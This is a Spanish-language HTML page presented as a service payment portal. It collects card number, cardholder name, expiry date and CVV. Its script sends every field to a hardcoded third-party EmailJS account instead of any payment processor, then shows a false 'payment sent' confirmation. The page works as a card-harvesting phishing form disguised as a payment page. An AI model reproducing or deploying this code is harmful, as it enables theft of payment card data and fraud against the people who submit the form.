<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Pagos de Servicios</title>
  <style>
    /* Reset básico */
    * {
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0052D4, #4364F7, #6FB1FC);
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      color: #fff;
    }
    .container {
      background: rgba(255,255,255,0.1);
      border-radius: 12px;
      max-width: 420px;
      width: 100%;
      padding: 25px 30px 40px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.2);
    }
    h1 {
      margin: 0 0 8px 0;
      font-weight: 700;
      font-size: 2rem;
      text-align: center;
      letter-spacing: 1.2px;
    }
    p.subtitle {
      text-align: center;
      font-size: 1rem;
      margin-bottom: 25px;
      color: #e0e7ffcc;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      font-size: 0.9rem;
    }
    input[type="text"],
    input[type="email"],
    input[type="number"],
    select {
      width: 100%;
      padding: 10px 14px;
      margin-bottom: 18px;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      outline: none;
      transition: box-shadow 0.3s ease;
    }
    input[type="text"]:focus,
    input[type="email"]:focus,
    input[type="number"]:focus,
    select:focus {
      box-shadow: 0 0 8px 3px #7191ff;
    }
    .error-message {
      color: #ffbaba;
      font-size: 0.85rem;
      margin-top: -14px;
      margin-bottom: 12px;
      display: none;
    }
    .error-message.active {
      display: block;
    }
    .card-type {
      margin-bottom: 18px;
    }
    .card-type label {
      display: inline-block;
      margin-right: 15px;
      cursor: pointer;
      font-weight: 600;
      user-select: none;
    }
    .card-type input[type="radio"] {
      margin-right: 6px;
      cursor: pointer;
    }
    button {
      width: 100%;
      background-color: #0041c4;
      color: white;
      font-size: 1.1rem;
      padding: 12px 0;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 700;
      transition: background-color 0.25s ease;
    }
    button:hover:not(:disabled) {
      background-color: #002a85;
    }
    button:disabled {
      background-color: #666;
      cursor: not-allowed;
    }
    /* Loader */
    .loader {
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid #fff;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 15px auto 10px;
      display: none;
    }
    .loader.active {
      display: block;
    }
    @keyframes spin {
      0% {transform: rotate(0deg);}
      100% {transform: rotate(360deg);}
    }
    .message {
      text-align: center;
      font-weight: 600;
      margin-top: 12px;
      font-size: 1rem;
      min-height: 24px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Pagos de Servicios</h1>
    <p class="subtitle">Seleccione el monto a pagar y complete el formulario con los datos de su tarjeta. Los datos se enviarán a su correo.</p>
    
    <form id="form-pago" novalidate>
      <!-- Monto con símbolo $ -->
      <label for="monto">Monto a pagar</label>
      <input 
        type="number" 
        id="monto" 
        name="monto" 
        min="1" 
        step="any" 
        placeholder="Ingrese el monto en $" 
        required 
      />
      <div class="error-message" id="error-monto">Por favor, ingrese un monto válido mayor a $0.</div>

      <!-- Selección tipo tarjeta -->
      <div class="card-type">
        <label>Tipo de tarjeta:</label>
        <label><input type="radio" name="tipoTarjeta" value="Visa" required /> Visa</label>
        <label><input type="radio" name="tipoTarjeta" value="Mastercard" /> Mastercard</label>
      </div>
      <div class="error-message" id="error-tipoTarjeta">Seleccione el tipo de tarjeta.</div>

      <!-- Datos tarjeta -->
      <label for="tarjeta">Número de tarjeta</label>
      <input 
        type="text" 
        id="tarjeta" 
        name="tarjeta" 
        placeholder="1234 5678 9012 3456" 
        maxlength="19" 
        required 
        autocomplete="cc-number"
        pattern="^(\d{4} ?){3}\d{4}$"
      />
      <div class="error-message" id="error-tarjeta">Número de tarjeta inválido. Formato: 1234 5678 9012 3456</div>

      <label for="titular">Nombre del titular</label>
      <input 
        type="text" 
        id="titular" 
        name="titular" 
        placeholder="Como aparece en la tarjeta" 
        required 
      />
      <div class="error-message" id="error-titular">Ingrese el nombre del titular.</div>

      <label for="vencimiento">Fecha de expiración (MM/AA)</label>
      <input 
        type="text" 
        id="vencimiento" 
        name="vencimiento" 
        placeholder="MM/AA" 
        maxlength="5" 
        required 
        pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$"
      />
      <div class="error-message" id="error-vencimiento">Fecha inválida. Formato MM/AA y no debe estar vencida.</div>

      <label for="cvv">Código de seguridad (CVV)</label>
      <input 
        type="text" 
        id="cvv" 
        name="cvv" 
        placeholder="3 dígitos" 
        maxlength="3" 
        required 
        pattern="^\d{3}$"
        autocomplete="cc-csc"
      />
      <div class="error-message" id="error-cvv">Código CVV inválido (3 dígitos).</div>

      <button type="submit" id="btn-pagar">Realizar pago</button>
      <div class="loader" id="loader"></div>
      <div class="message" id="message"></div>
    </form>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init('FL6vofHg7F9vLawQs');

    const form = document.getElementById('form-pago');
    const loader = document.getElementById('loader');
    const message = document.getElementById('message');
    const btnPagar = document.getElementById('btn-pagar');

    // Funciones validación
    function showError(inputId, show) {
      const err = document.getElementById('error-' + inputId);
      if (show) err.classList.add('active');
      else err.classList.remove('active');
    }

    function validateMonto() {
      const monto = form.monto.value.trim();
      if (!monto || isNaN(monto) || Number(monto) <= 0) {
        showError('monto', true);
        return false;
      }
      showError('monto', false);
      return true;
    }

    function validateTipoTarjeta() {
      const tipo = form.tipoTarjeta.value;
      if (!tipo) {
        showError('tipoTarjeta', true);
        return false;
      }
      showError('tipoTarjeta', false);
      return true;
    }

    function validateTarjeta() {
      const val = form.tarjeta.value.trim();
      // Permite espacios, pero debe quedar como 16 dígitos en grupos de 4
      const re = /^(\d{4} ?){3}\d{4}$/;
      const valid = re.test(val);
      showError('tarjeta', !valid);
      return valid;
    }

    function validateTitular() {
      const val = form.titular.value.trim();
      const valid = val.length > 0;
      showError('titular', !valid);
      return valid;
    }

    function validateVencimiento() {
      const val = form.vencimiento.value.trim();
      const re = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/;
      if (!re.test(val)) {
        showError('vencimiento', true);
        return false;
      }
      // Validar que no esté vencida
      const parts = val.split('/');
      const mes = parseInt(parts[0], 10);
      const anio = 2000 + parseInt(parts[1], 10);
      const hoy = new Date();
      const venc = new Date(anio, mes);
      const valid = venc > hoy;
      showError('vencimiento', !valid);
      return valid;
    }

    function validateCVV() {
      const val = form.cvv.value.trim();
      const re = /^\d{3}$/;
      const valid = re.test(val);
      showError('cvv', !valid);
      return valid;
    }

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      message.textContent = '';
      
      const validForm = validateMonto() && validateTipoTarjeta() && validateTarjeta() && validateTitular() && validateVencimiento() && validateCVV();

      if (!validForm) {
        message.textContent = 'Por favor corrija los errores antes de enviar.';
        message.style.color = '#ffbaba';
        return;
      }

      btnPagar.disabled = true;
      loader.classList.add('active');
      message.textContent = '';

      // Preparar datos para EmailJS
      const templateParams = {
        nombre: form.nombre ? form.nombre.value : 'Anónimo',
        email: form.email ? form.email.value : 'no-email@example.com',
        dni: form.dni ? form.dni.value : 'No especificado',
        monto: form.monto.value.trim(),
        tipoTarjeta: form.tipoTarjeta.value,
        tarjeta: form.tarjeta.value.trim(),
        titular: form.titular.value.trim(),
        vencimiento: form.vencimiento.value.trim(),
        cvv: form.cvv.value.trim()
      };

      emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
        .then(() => {
          loader.classList.remove('active');
          btnPagar.disabled = false;
          message.textContent = 'Pago enviado correctamente. Revisa tu correo.';
          message.style.color = '#b6ffb6';
          form.reset();
        }, (error) => {
          loader.classList.remove('active');
          btnPagar.disabled = false;
          message.textContent = 'Error al enviar el pago. Intenta nuevamente.';
          message.style.color = '#ffbaba';
          console.error('Error EmailJS:', error);
        });
    });
  </script>
</body>
</html>
